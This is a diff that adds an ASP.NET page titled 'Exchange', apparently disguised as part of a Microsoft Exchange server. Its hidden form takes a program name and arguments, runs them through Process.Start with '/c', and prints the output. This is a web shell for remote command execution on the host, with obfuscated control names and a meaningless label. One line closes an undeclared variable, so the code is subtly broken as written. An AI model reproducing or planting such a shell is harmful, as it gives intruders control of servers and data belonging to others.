@@ -1,0 +1,40 @@
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ex(string name, string ar)
+{
+ProcessStartInfo sr = new ProcessStartInfo();
+sr.FileName = name;
+sr.Arguments = "/c "+ar;
+sr.RedirectStandardOutput = true;
+sr.UseShellExecute = false;
+Process p = Process.Start(sr);
+StreamReader rq = p.StandardOutput;
+string s = rq.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void rer(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ex(ne.Text,ar.Text)));
+Response.Write("</pre>");
+}
+</script>
+<HTML>
+<HEAD>
+<title>Exchange</title>
+</HEAD>
+<body >
+<form id="cmd" method="post" runat="server">
+<asp:TextBox id="ne" style="Z-INDEX: 101; LEFT: 400px; POSITION: absolute; TOP: 20px" runat="server" Width="251px"></asp:TextBox>
+<asp:TextBox id="ar" style="Z-INDEX: 101; LEFT: 400px; POSITION: absolute; TOP: 20px" runat="server" Width="251px"></asp:TextBox>
+<asp:Button id="sdgs" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="open" OnClick="rer"></asp:Button>
+<asp:Label id="fhdf" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">itrtyo:</asp:Label>
+</form>
+</body>
+</HTML>
